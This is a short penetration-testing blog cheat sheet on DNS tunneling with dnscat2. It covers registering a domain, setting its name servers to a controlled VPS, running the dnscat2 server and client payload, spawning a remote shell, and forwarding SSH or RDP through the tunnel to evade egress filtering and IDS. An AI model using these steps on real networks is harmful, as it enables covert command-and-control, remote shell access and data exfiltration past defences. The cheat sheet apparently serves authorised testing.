---
layout: blog_item
title: "DNS Tunneling dnscat2 Cheat Sheet"
date:   2021-06-04 10:29:10
author: Arr0way
description: 'Learn what DNS tunneling is, when to use it on a pen test and how to tunnel over DNS using dnscat2.'
categories: [cheat-sheet]
tags:

- 'Infrastructure'
---

* list element with functor item
{:toc}

## What is DNS Tunneling 

DNS tunneling is used to evade egress firewall rules and/or IDS / proxy or other web filtering applicances by tunneling data over DNS. DNS tunneling usually works as external DNS resolution is available on most networks, it should be noted that DNS tunneling is slow due to the low amounts of data that can be transfered. 
<!--more-->

**What You Will Learn:**

- What is DNS tunneling 
- How to setup dnscat2
- How to tunnel data over dnscat2 

## You Will Need

1. A real world domain, <a href="https://www.namesilo.com/?rid=45f0146bp " rel="nofollow">NameSilo</a> works well and has free WHOIS privacy.
2. A VPS to run DNSCAT2 - <a href="https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42" rel="nofollow">Linode is cheap and works for this and this link will give you a $100 voucher</a> (see instructions below) 

In order to tunnel data over DNS a real world domain must be used and the domains authoritivate name servers must be set to servers in your control. 


## Buying a Domain 

<a href="https://www.namesilo.com/?rid=45f0146bp " rel="nofollow">NameSilo</a>  offers free domain WHOIS privacy, a lot of extensions and is well priced. 

### How to Change Name Servers On NameSilo 

Login to <a href="https://www.namesilo.com/?rid=45f0146bp " rel="nofollow">NameSilo</a> and follow these instructions to change the authoritative name servers: 

1.  Go to the Domain Manager page within your account
2.  Click the applicable domain name (it will be underlined in black)
3.  Click the "View/Manage Registered NameServers" link within the "NameServers" box

## DNS Forwarding with Dnscat2  

1. Install dsncat2 ```apt-get install dnscat2 -y```
2. Run:  ```dnscat2-server yourdomain.com``` on your VPS
3. From the client machine you will need to run the dnscat2 payload 
4. If your domain's NS are configured correctly the session should be established 
5. Enter ```session -i``` to spawn an interactive session 
6.  Launch a shell using ```shell```

## Dnscat2 Port Forwarding 

Dnscat2 supports TCP forwarding allowing you to tunnel SSH or RDP connections over the established DNS tunnel. 

{% highlight bash %} 
command (client) 4> listen 127.0.0.1:22 target:22 
{% endhighlight %}

Again this will slow but functional. 

Enjoy.	
